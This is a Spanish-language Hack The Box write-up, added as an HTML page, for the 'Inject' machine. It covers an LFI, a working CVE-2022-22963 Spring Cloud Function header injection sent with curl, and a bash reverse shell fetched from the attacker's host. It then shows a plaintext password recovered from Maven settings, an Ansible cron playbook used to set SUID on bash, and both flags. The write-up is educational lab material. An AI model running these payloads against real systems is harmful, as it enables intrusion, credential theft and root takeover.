@@ -1,0 +1,422 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>HackTheBox - Inject (easy) · MiguelRega7</title>
+<meta name="description" content="- Inject is an Easy Difficulty Linux machine featuring a website with file upload functionality vulnerable to Local File Inclusion (LFI). By exploiting the LFI vulnerability, files"><meta name="theme-color" content="#070a0f">
+<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<header class="header"><div class="nav wrap">
+<a class="brand" href="/" aria-label="MiguelRega7">MR<em>7</em></a>
+<nav class="links"><a class="nav-link" data-nav="home" href="/">INICIO</a><a class="nav-link" data-nav="writeups" href="/#writeups">WRITEUPS</a><a class="nav-link" data-nav="about" href="/about/">ABOUT</a></nav>
+<div class="socials">
+<a href="https://github.com/MikeRega7" target="_blank" rel="noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .7a11.5 11.5 0 0 0-3.64 22.4c.58.1.79-.25.79-.56v-2.04c-3.2.7-3.87-1.35-3.87-1.35-.52-1.32-1.27-1.67-1.27-1.67-1.04-.71.08-.7.08-.7 1.15.08 1.75 1.18 1.75 1.18 1.02 1.74 2.67 1.24 3.32.95.1-.74.4-1.24.72-1.53-2.55-.29-5.24-1.28-5.24-5.7 0-1.26.45-2.29 1.18-3.1-.12-.3-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.73 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.75.11 3.05.74.81 1.18 1.84 1.18 3.1 0 4.43-2.7 5.4-5.26 5.69.41.35.77 1.04.77 2.1v3.07c0 .31.21.67.8.55A11.5 11.5 0 0 0 12 .7Z"/></svg></a>
+<a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" rel="noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M5.2 3.2A2.2 2.2 0 1 1 5.2 7.6a2.2 2.2 0 0 1 0-4.4ZM3.4 8.9h3.6V20H3.4V8.9Zm5.8 0h3.4v1.52h.05c.47-.9 1.62-1.84 3.34-1.84 3.57 0 4.23 2.35 4.23 5.4V20h-3.55v-5.34c0-1.27-.02-2.91-1.77-2.91-1.78 0-2.05 1.39-2.05 2.82V20H9.2V8.9Z"/></svg></a>
+<a href="https://www.instagram.com/_miguelitornuno7" target="_blank" rel="noreferrer" aria-label="Instagram"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="1.8" d="M7 2.9h10A4.1 4.1 0 0 1 21.1 7v10a4.1 4.1 0 0 1-4.1 4.1H7A4.1 4.1 0 0 1 2.9 17V7A4.1 4.1 0 0 1 7 2.9Z"/><circle cx="12" cy="12" r="3.3" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="17.5" cy="6.7" r=".9" fill="currentColor"/></svg></a>
+
+</div><button class="menu" type="button" aria-label="Abrir menú" aria-expanded="false">☰</button>
+</div></header>
+<main class="wrap"><header class="article-head"><a class="back" href="/#writeups">← VOLVER A WRITEUPS</a><div class="article-head-row"><div><span class="article-tag">Hack The Box</span><h1>HackTheBox - Inject (easy)</h1><div class="meta"><span>◷</span><time>2024-06-02</time><span>·</span><span>WRITEUP</span><span>·</span><span>MR7 LAB</span></div></div><div class="share"><span>Compartir</span><button type="button" class="share-btn" data-copy-url="true">↗</button></div></div><p class="article-excerpt">- Inject is an Easy Difficulty Linux machine featuring a website with file upload functionality vulnerable to Local File Inclusion (LFI). By exploiting the LFI vulnerability, files.</p></header><div class="article-layout"><aside class="aside"><div class="aside-title">CONTENIDO</div><a href="#portscan">PortScan</a><a href="#enumeraci-n-y-lfi">Enumeración y LFI</a><a href="#spring-cloud-function">Spring Cloud Function</a><a href="#shell-as-frank">Shell as frank</a><a href="#shell-as-phil">Shell as phil</a><a href="#user-flag">User flag</a><a href="#privilege-escalation">Privilege Escalation</a><a href="#shell-as-root">Shell as root</a></aside><article class="article-content" id="top"><p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/285ba8819710b6ae1f67bc0e5914ffd9.png">
+</p>
+
+<ul>
+<li>Inject is an Easy Difficulty Linux machine featuring a website with file upload functionality vulnerable to Local File Inclusion (LFI). By exploiting the LFI vulnerability, files on the system can be enumerated, revealing that the web application uses a specific version of the <code>Spring-Cloud-Function-Web</code> module susceptible to <code>CVE-2022-22963</code>. Exploiting this vulnerability grants an initial foothold as the <code>frank</code> user. Lateral movement is achieved by further file enumeration, which discloses a plaintext password for <code>phil</code>. A cronjob running on the machine can then be exploited to execute a malicious <code>Ansible</code> playbook, ultimately obtaining a reverse shell as the <code>root</code> user.</li>
+</ul>
+<h2 id="portscan">PortScan</h2>
+<ul>
+<li>Comenzamos escaneando los puertos abiertos y sus servicios por el protocolo <strong>TCP</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap sudo nmap -sCV -p22,8080 10.10.11.204 -oN targeted
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-02 11:53 CST
+Nmap scan report for 10.10.11.204
+Host is up (0.084s latency).
+
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
+|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
+|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
+8080/tcp open  nagios-nsca Nagios NSCA
+|_http-title: Home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+<h2 id="enumeraci-n-y-lfi">Enumeración y LFI</h2>
+<ul>
+<li>Vemos las versiones que esta corriendo el servicio web que al parecer no son muchas.</li>
+</ul>
+<div class="code-window" data-language="Ruby"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Ruby</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-ruby">➜  nmap whatweb http://10.10.11.204:8080
+http://10.10.11.204:8080 [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], Frame, HTML5, IP[10.10.11.204], Title[Home], YouTube
+</code></pre></div></div>
+<ul>
+<li>Esta es la pagina web.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/1.png">
+</p>
+
+<ul>
+<li>En la parte de <strong>register</strong> no vemos nada importante.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/2.png">
+</p>
+
+<ul>
+<li>La parte de <strong>blogs</strong> funciona y vemos algunos usuarios.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/3.png">
+</p>
+
+<ul>
+<li>Sin embargo hay una ruta que se llama <strong>/upload</strong> la cual esta si funciona.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/4.png">
+</p>
+
+<ul>
+<li><p>Vamos a subir un archivo cualquiera en este caso un <code>.txt</code>.</p>
+</li>
+<li><p>Sin embargo aunque lo subamos nos da esta respuesta.</p>
+</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/5.png">
+</p>
+
+<ul>
+<li>Si probamos con una imagen funciona.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/6.png">
+</p>
+
+<ul>
+<li>Podemos ver la imagen y la <code>url</code> es interesante.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/7.png">
+</p>
+
+<ul>
+<li>Vamos a capturar la petición con <code>burpsuite</code> al momento de abrir la imagen y si probamos un LFI vemos que funciona.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/8.png">
+</p>
+
+<ul>
+<li>Hay 2 usuarios.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/9.png">
+</p>
+
+<ul>
+<li>Si vemos lo que hay dentro del directorio de <code>frank</code> encontramos esto.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/10.png">
+</p>
+
+<ul>
+<li>Aquí vemos una contraseña y un <code>.xml</code> con información.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/11.png">
+</p>
+
+<blockquote>
+<p>La contraseña no funciona para conectarnos por SSH.</p>
+</blockquote>
+<blockquote>
+<p>El archivo de configuración que ha mostrado pertenece a Maven, que es una herramienta de gestión y comprensión de proyectos de software. Este archivo específico se usa para configurar ajustes relacionados con la construcción y gestión de proyectos en Maven By ChatGPT.</p>
+</blockquote>
+<ul>
+<li>Vemos que ya nos hablan de <code>Java</code>.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/12.png">
+</p>
+
+<ul>
+<li>Vemos un <code>WebApp</code> con archivos interesantes.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/13.png">
+</p>
+
+<ul>
+<li>Si le decimos a <code>ChatGPT</code> a que corresponden esos archivos nos dice que pertenecen a Maven.</li>
+</ul>
+<blockquote>
+<p>La imagen que has proporcionado muestra una lista de archivos y directorios que son comunes en un proyecto de Java utilizando Maven como sistema de gestión y construcción de proyectos.</p>
+</blockquote>
+<h2 id="spring-cloud-function">Spring Cloud Function</h2>
+<ul>
+<li>En el archivo <code>pom.xml</code> encontramos información incluye dependencias, propiedades del proyecto y configuraciones especificas de compilación.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/14.png">
+</p>
+
+<ul>
+<li>Nos da la versión que se esta utilizando para la biblioteca <code>spring-cloud-function-web</code> con versión <code>3.2.2</code>.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/15.png">
+</p>
+
+<ul>
+<li><p>Esta versión es vulnerable <a href="https://nsfocusglobal.com/spring-cloud-function-spel-expression-injection-vulnerability-alert/">https://nsfocusglobal.com/spring-cloud-function-spel-expression-injection-vulnerability-alert/</a>.</p>
+</li>
+<li><p>Aquí nos explican en que consiste y como se explota <a href="https://sysdig.com/blog/cve-2022-22963-spring-cloud/">https://sysdig.com/blog/cve-2022-22963-spring-cloud/</a>.</p>
+</li>
+<li><p>Al parecer aprovecha de <code>Runtime.getRuntime().exec()</code> que es un método en Java para ejecutar comandos.</p>
+</li>
+<li><p>Para ver si es vulnerable vamos hacer una petición con <code>curl</code>  a la ruta <code>functionRouter</code> lo que vamos hacer es crear un archivo en el directorio <code>/tmp</code>.</p>
+</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/17.png">
+</p>
+
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content curl -X POST http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&quot;touch /tmp/pwned&quot;)' --data-raw 'data' -v
+Note: Unnecessary use of -X or --request, POST is already inferred.
+*   Trying 10.10.11.204:8080...
+* Connected to 10.10.11.204 (10.10.11.204) port 8080
+&gt; POST /functionRouter HTTP/1.1
+&gt; Host: 10.10.11.204:8080
+&gt; User-Agent: curl/8.5.0
+&gt; Accept: */*
+&gt; spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&quot;touch /tmp/pwned&quot;)
+&gt; Content-Length: 4
+&gt; Content-Type: application/x-www-form-urlencoded
+&gt;
+&lt; HTTP/1.1 500
+&lt; Content-Type: application/json
+&lt; Transfer-Encoding: chunked
+&lt; Date: Sun, 02 Jun 2024 18:52:19 GMT
+&lt; Connection: close
+&lt;
+* Closing connection
+{&quot;timestamp&quot;:&quot;2024-06-02T18:52:19.471+00:00&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&quot;,&quot;path&quot;:&quot;/functionRouter&quot;}%                                   
+</code></pre></div></div>
+<ul>
+<li>Si comprobamos desde el <strong>LFI</strong> vemos que efectivamente se creo.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/16.png">
+</p>
+
+<h2 id="shell-as-frank">Shell as frank</h2>
+<ul>
+<li>Para obtener una <code>shell</code> vamos a crear un <code>.sh</code> que contenga una reverse <code>shell</code> y lo vamos a compartir mediante un servidor http con python3 para poder descargarlo en la maquina victima y hacer una petición al archivo.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content cat reverse.php
+#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/10.10.14.55/443 0&gt;&amp;1
+➜  content python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre></div></div>
+<ul>
+<li>Ahora nos ponemos en escucha.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  ~ nc -nlvp 443
+listening on [any] 443 ...
+</code></pre></div></div>
+<ul>
+<li>Ahora subimos el archivo a la máquina.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content curl -X POST http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&quot;curl http://10.10.14.55:80/reverse.sh -o /tmp/reverse.sh&quot;)' --data-raw 'data' -v
+Note: Unnecessary use of -X or --request, POST is already inferred.
+*   Trying 10.10.11.204:8080...
+* Connected to 10.10.11.204 (10.10.11.204) port 8080
+&gt; POST /functionRouter HTTP/1.1
+&gt; Host: 10.10.11.204:8080
+&gt; User-Agent: curl/8.5.0
+&gt; Accept: */*
+&gt; spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&quot;curl http://10.10.14.55:80/reverse.sh -o /tmp/reverse.sh&quot;)
+&gt; Content-Length: 4
+&gt; Content-Type: application/x-www-form-urlencoded
+&gt;
+&lt; HTTP/1.1 500
+&lt; Content-Type: application/json
+&lt; Transfer-Encoding: chunked
+&lt; Date: Sun, 02 Jun 2024 18:58:15 GMT
+&lt; Connection: close
+&lt;
+* Closing connection
+{&quot;timestamp&quot;:&quot;2024-06-02T18:58:15.168+00:00&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&quot;,&quot;path&quot;:&quot;/functionRouter&quot;}
+</code></pre></div></div>
+<ul>
+<li>Ahora le damos permisos de ejecución.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content curl -X POST http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&quot;chmod +x /tmp/reverse.sh&quot;)' --data-raw 'data' -v
+Note: Unnecessary use of -X or --request, POST is already inferred.
+*   Trying 10.10.11.204:8080...
+* Connected to 10.10.11.204 (10.10.11.204) port 8080
+&gt; POST /functionRouter HTTP/1.1
+&gt; Host: 10.10.11.204:8080
+&gt; User-Agent: curl/8.5.0
+&gt; Accept: */*
+&gt; spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&quot;chmod +x /tmp/reverse.sh&quot;)
+&gt; Content-Length: 4
+&gt; Content-Type: application/x-www-form-urlencoded
+&gt;
+&lt; HTTP/1.1 500
+&lt; Content-Type: application/json
+&lt; Transfer-Encoding: chunked
+&lt; Date: Sun, 02 Jun 2024 18:59:10 GMT
+&lt; Connection: close
+&lt;
+* Closing connection
+{&quot;timestamp&quot;:&quot;2024-06-02T18:59:10.711+00:00&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&quot;,&quot;path&quot;:&quot;/functionRouter&quot;}
+</code></pre></div></div>
+<ul>
+<li>Y por ultimo lo ejecutamos para obtener <code>shell</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content curl -X POST http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&quot;bash /tmp/reverse.sh&quot;)' --data-raw 'data' -v
+Note: Unnecessary use of -X or --request, POST is already inferred.
+*   Trying 10.10.11.204:8080...
+* Connected to 10.10.11.204 (10.10.11.204) port 8080
+&gt; POST /functionRouter HTTP/1.1
+&gt; Host: 10.10.11.204:8080
+&gt; User-Agent: curl/8.5.0
+&gt; Accept: */*
+&gt; spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&quot;bash /tmp/reverse.sh&quot;)
+&gt; Content-Length: 4
+&gt; Content-Type: application/x-www-form-urlencoded
+&gt;
+&lt; HTTP/1.1 500
+&lt; Content-Type: application/json
+&lt; Transfer-Encoding: chunked
+&lt; Date: Sun, 02 Jun 2024 19:00:11 GMT
+&lt; Connection: close
+&lt;
+* Closing connection
+{&quot;timestamp&quot;:&quot;2024-06-02T19:00:11.233+00:00&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&quot;,&quot;path&quot;:&quot;/functionRouter&quot;}
+</code></pre></div></div>
+<ul>
+<li>Recibimos la <code>shell</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  ~ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.55] from (UNKNOWN) [10.10.11.204] 42862
+bash: cannot set terminal process group (827): Inappropriate ioctl for device
+bash: no job control in this shell
+frank@inject:/$ whoami
+whoami
+frank
+frank@inject:/$
+</code></pre></div></div>
+<h2 id="shell-as-phil">Shell as phil</h2>
+<ul>
+<li>Si recordamos tenemos la contraseña de <strong>phil</strong> de primeras no pudimos conectarnos por <code>ssh</code> pero si podemos migrar a ese usuario desde la <code>shell</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">frank@inject:~/.m2$ cat settings.xml
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;settings xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+        xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
+  &lt;servers&gt;
+    &lt;server&gt;
+      &lt;id&gt;Inject&lt;/id&gt;
+      &lt;username&gt;phil&lt;/username&gt;
+      &lt;password&gt;DocPhillovestoInject123&lt;/password&gt;
+      &lt;privateKey&gt;${user.home}/.ssh/id_dsa&lt;/privateKey&gt;
+      &lt;filePermissions&gt;660&lt;/filePermissions&gt;
+      &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt;
+      &lt;configuration&gt;&lt;/configuration&gt;
+    &lt;/server&gt;
+  &lt;/servers&gt;
+&lt;/settings&gt;
+frank@inject:~/.m2$
+</code></pre></div></div>
+<ul>
+<li>Funciona.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">frank@inject:~/.m2$ su phil
+Password:
+phil@inject:/home/frank/.m2$ id
+uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
+phil@inject:/home/frank/.m2$
+</code></pre></div></div>
+<h2 id="user-flag">User flag</h2>
+<ul>
+<li>Podemos ver la flag.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">phil@inject:~$ cat user.txt
+8dc5c8c4c03735847448fbf460738832
+phil@inject:~$
+</code></pre></div></div>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<ul>
+<li>Al no encontrar nada interesante decidí ejecutar <code>pspy64</code> para ver tareas <code>cron</code> y encontré esta, corre <code>ansible-parallel</code> <a href="https://pypi.org/project/ansible-parallel/">https://pypi.org/project/ansible-parallel/</a>.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/escalada.png">
+</p>
+
+<ul>
+<li>Allí vemos la estructura del <code>.yml</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">phil@inject:/opt/automation$ cd tasks/
+phil@inject:/opt/automation/tasks$ ls
+playbook_1.yml
+phil@inject:/opt/automation/tasks$ cat playbook_1.yml
+- hosts: localhost
+  tasks:
+  - name: Checking webapp service
+    ansible.builtin.systemd:
+      name: webapp
+      enabled: yes
+      state: started
+phil@inject:/opt/automation/tasks$
+</code></pre></div></div>
+<ul>
+<li>Vemos que el directorio <code>tasks</code> corresponde al grupo staff y nosotros estamos allí y podemos escribir.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">phil@inject:/opt/automation/tasks$ id
+uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
+phil@inject:/opt/automation/tasks$ cd ..
+phil@inject:/opt/automation$ ls -l
+total 4
+drwxrwxr-x 2 root staff 4096 Jun  2 19:26 tasks
+</code></pre></div></div>
+<ul>
+<li>Como es una tarea cron lo que vamos hacer es asignarle privilegios <code>SUID</code> ala <code>bash</code> usando el modulo <code>ansible.builtin.shell</code> <a href="https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html">https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html</a>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">phil@inject:/opt/automation/tasks$ cat playbook_2.yml
+- hosts: localhost
+  tasks:
+    - name: SUID
+      ansible.builtin.shell: |
+        chmod +s /bin/bash
+      become: true
+phil@inject:/opt/automation/tasks$
+</code></pre></div></div>
+<ul>
+<li>Vamos a esperar a que se ejecute la tarea y ver si las <code>bash</code> se le otorga el privilegio <code>SUID</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">phil@inject:/opt/automation/tasks$ ls -l /bin/bash
+-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
+phil@inject:/opt/automation/tasks$
+</code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<ul>
+<li>Ahora ya estamos como <code>root</code> y vemos la <code>flag</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">phil@inject:/opt/automation/tasks$ bash -p
+bash-5.0# whoami
+root
+bash-5.0# cat /root/root.txt
+5a756880b37d955eee4996c9ef8a0620
+bash-5.0#
+</code></pre></div></div>
+</article></div></main>
+<footer class="footer wrap"><div><b>MR<em>7</em></b><div>Cybersecurity notes &amp; writeups.</div></div><div class="footer-links"><a href="https://github.com/MikeRega7">GitHub</a><a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278">LinkedIn</a><a href="https://www.instagram.com/_miguelitornuno7">Instagram</a></div></footer>
+<script src="/app.js?v=10"></script></body></html>
